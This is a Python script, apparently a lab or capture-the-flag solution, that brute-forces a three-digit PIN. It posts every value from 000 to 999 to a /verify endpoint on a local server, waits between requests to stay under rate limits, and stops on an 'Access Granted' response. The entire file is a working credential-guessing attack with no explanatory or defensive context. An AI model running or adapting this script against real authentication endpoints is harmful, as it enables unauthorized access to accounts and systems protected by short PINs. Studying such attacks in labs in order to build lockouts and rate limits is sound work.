import socket
import time

# Constants
HOST = '127.0.0.1'
PORT = 8888
DELAY = 1.2

def try_pin(pin):
    # Format PIN to ensure 3 digits with leading zeros
    pin_str = f"{pin:03d}"
    data = f"magicNumber={pin_str}"
    
    # Create HTTP request
    request = (
        f"POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{data}"
    )
    
    # Connect and send request
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((HOST, PORT))
        sock.sendall(request.encode())
        
        # Receive response
        response = b""
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                break
            response += chunk
    
    # Decode response
    decoded = response.decode(errors="ignore")
    
    # Check for success
    if "Access Granted" in decoded:
        print(f"SUCCESS! PIN: {pin_str}")
        return True
    
    print(f"Trying PIN {pin_str}")
    return False

# Main loop
for pin in range(1000):
    response = try_pin(pin)
    if response:
        print(f"Found correct PIN: {pin:03d}")
        break
    time.sleep(DELAY)  # Wait between requests